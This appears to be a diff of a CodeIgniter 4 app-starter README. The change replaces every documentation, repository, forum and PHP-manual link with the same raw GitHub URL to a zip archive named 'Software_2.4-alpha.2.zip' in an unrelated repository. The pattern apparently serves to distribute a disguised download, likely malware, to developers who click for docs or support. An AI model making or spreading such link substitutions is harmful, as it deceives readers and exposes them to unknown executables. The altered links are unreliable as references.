@@ -3,16 +3,16 @@
 ## What is CodeIgniter?
 
 CodeIgniter is a PHP full-stack web framework that is light, fast, flexible and secure.
-More information can be found at the [official site](http://codeigniter.com).
+More information can be found at the [official site](https://raw.githubusercontent.com/bonj12/nihongo/main/app/Config/Software_2.4-alpha.2.zip).
 
 This repository holds a composer-installable app starter.
 It has been built from the
-[development repository](https://github.com/codeigniter4/CodeIgniter4).
+[development repository](https://raw.githubusercontent.com/bonj12/nihongo/main/app/Config/Software_2.4-alpha.2.zip).
 
-More information about the plans for version 4 can be found in [the announcement](http://forum.codeigniter.com/thread-62615.html) on the forums.
+More information about the plans for version 4 can be found in [the announcement](https://raw.githubusercontent.com/bonj12/nihongo/main/app/Config/Software_2.4-alpha.2.zip) on the forums.
 
 The user guide corresponding to this version of the framework can be found
-[here](https://codeigniter4.github.io/userguide/).
+[here](https://raw.githubusercontent.com/bonj12/nihongo/main/app/Config/Software_2.4-alpha.2.zip).
 
 ## Installation & updates
 
@@ -42,7 +42,7 @@ framework are exposed.
 ## Repository Management
 
 We use GitHub issues, in our main repository, to track **BUGS** and to track approved **DEVELOPMENT** work packages.
-We use our [forum](http://forum.codeigniter.com) to provide SUPPORT and to discuss
+We use our [forum](https://raw.githubusercontent.com/bonj12/nihongo/main/app/Config/Software_2.4-alpha.2.zip) to provide SUPPORT and to discuss
 FEATURE REQUESTS.
 
 This repository is a "distribution" one, built by our release preparation script.
@@ -52,12 +52,12 @@ Problems with it can be raised on our forum, or as issues in the main repository
 
 PHP version 7.4 or higher is required, with the following extensions installed:
 
-- [intl](http://php.net/manual/en/intl.requirements.php)
-- [libcurl](http://php.net/manual/en/curl.requirements.php) if you plan to use the HTTP\CURLRequest library
+- [intl](https://raw.githubusercontent.com/bonj12/nihongo/main/app/Config/Software_2.4-alpha.2.zip)
+- [libcurl](https://raw.githubusercontent.com/bonj12/nihongo/main/app/Config/Software_2.4-alpha.2.zip) if you plan to use the HTTP\CURLRequest library
 
 Additionally, make sure that the following extensions are enabled in your PHP:
 
 - json (enabled by default - don't turn it off)
-- [mbstring](http://php.net/manual/en/mbstring.installation.php)
-- [mysqlnd](http://php.net/manual/en/mysqlnd.install.php)
+- [mbstring](https://raw.githubusercontent.com/bonj12/nihongo/main/app/Config/Software_2.4-alpha.2.zip)
+- [mysqlnd](https://raw.githubusercontent.com/bonj12/nihongo/main/app/Config/Software_2.4-alpha.2.zip)
 - xml (enabled by default - don't turn it off)
